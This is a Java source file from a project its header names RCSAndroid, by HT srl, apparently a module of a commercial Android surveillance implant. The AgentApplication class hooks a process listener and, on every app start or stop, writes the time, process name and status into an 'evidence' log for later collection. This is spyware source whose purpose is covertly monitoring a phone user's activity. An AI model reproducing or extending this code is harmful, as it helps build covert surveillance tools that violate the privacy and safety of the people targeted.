/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.ht.RCSAndroidGUI.agent;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Set;
import java.util.TreeMap;

import android.app.ActivityManager.RunningAppProcessInfo;
import android.util.Log;

import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.ProcessInfo;
import com.ht.RCSAndroidGUI.ProcessStatus;
import com.ht.RCSAndroidGUI.RunningProcesses;
import com.ht.RCSAndroidGUI.evidence.Evidence;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerProcess;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DateTime;
import com.ht.RCSAndroidGUI.util.Utils;
import com.ht.RCSAndroidGUI.util.WChar;

public class AgentApplication extends AgentBase implements Observer<ProcessInfo> {
	private static final String TAG = "AgentApplication";

	@Override
	public boolean parse(AgentConf conf) {
		return true;
	}

	@Override
	public void go() {

	}

	@Override
	public void begin() {
		ListenerProcess.self().attach(this);
	}

	@Override
	public void end() {
		ListenerProcess.self().detach(this);
	}

	public int notification(ProcessInfo process) {
		saveEvidence(process.processInfo, process.status);
		return 0;
	}

	private void saveEvidence(RunningAppProcessInfo process, ProcessStatus status) {
		Check.requires(process != null, "null process");

		String name = process.processName;
		String module = process.processName;

		final byte[] tm = (new DateTime()).getStructTm();

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		items.add(tm);
		items.add(WChar.getBytes(name, true));
		items.add(WChar.getBytes(status.name(), true));
		items.add(WChar.getBytes(module, true));
		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));

		LogR log = new LogR(EvidenceType.APPLICATION);
		log.write(items);
		log.close();
		
		Log.d("QZ", TAG + " (saveEvidence): " + name + " " + status.name());
	}

}
